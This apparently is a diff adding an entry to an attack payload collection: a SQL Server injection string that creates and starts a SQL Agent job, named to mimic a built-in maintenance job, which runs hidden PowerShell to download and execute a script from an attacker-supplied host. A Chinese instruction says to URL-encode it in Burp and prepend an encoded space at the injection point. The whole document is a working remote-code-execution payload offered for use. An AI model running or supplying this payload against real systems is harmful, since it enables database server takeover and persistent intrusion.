@@ -1,0 +1,2 @@
+	USE msdb; EXEC dbo.sp_add_job @job_name = N'syspolicy_purge_now' ; EXEC sp_add_jobstep @job_name = N'syspolicy_purge_now', @step_name = N'syspolicy_purge_step1', @subsystem = N'PowerShell', @command = N'powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(''http://IP_OR_HOSTNAME/file''))"', @retry_attempts = 1, @retry_interval = 5 ;EXEC dbo.sp_add_jobserver @job_name = N'syspolicy_purge_now '; EXEC dbo.sp_start_job N'syspolicy_purge_now ';
+	使用在注入点处，使用burp进行url编码，编码后前面加%20(空格URL编码)
